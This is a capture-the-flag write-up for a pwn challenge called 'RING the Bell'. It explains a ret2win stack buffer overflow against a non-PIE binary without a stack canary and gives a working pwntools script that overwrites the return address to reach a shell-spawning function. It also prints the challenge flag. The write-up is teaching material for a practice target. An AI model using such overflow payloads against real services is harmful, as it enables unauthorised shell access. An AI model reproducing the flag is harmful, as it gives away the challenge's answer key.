
# 1. RING the Bell

**Category:** pwn — stack buffer overflow (ret2win) **Protections:** No PIE · No canary · NX enabled (unused — jumped to existing code)

## Approach

Static analysis of the binary showed `main()` reserving a 32-byte stack buffer but reading up to 96 bytes into it:

```c
char buf[32];          // sub rsp, 0x20
read(0, buf, 0x60);    // 96 bytes read - 64 bytes of overflow
```

With no stack canary, the overflow reaches the saved return address cleanly. The binary also shipped an unused function, `bell()`, which called:

```c
execl("/bin/sh", "sh", NULL);
```

A classic "win function" — no leak needed since the binary is non-PIE, so `bell()`'s address is fixed at compile time.

**Stack layout:** `buffer(32) + saved_rbp(8) = 40` bytes of padding before the return address.

```python
from pwn import *

io = remote(HOST, PORT)
payload = b"A" * 40 + p64(0x40176d)  # address of bell()
io.sendline(payload)
io.interactive()
```

## Flag

```
HTB{R1ng4_R1ng4_R1111111nG_9559a5d510ff5371240f02d0b5fae750}
```
## Author: [Anurag886354](https://github.com/Anurag886354)


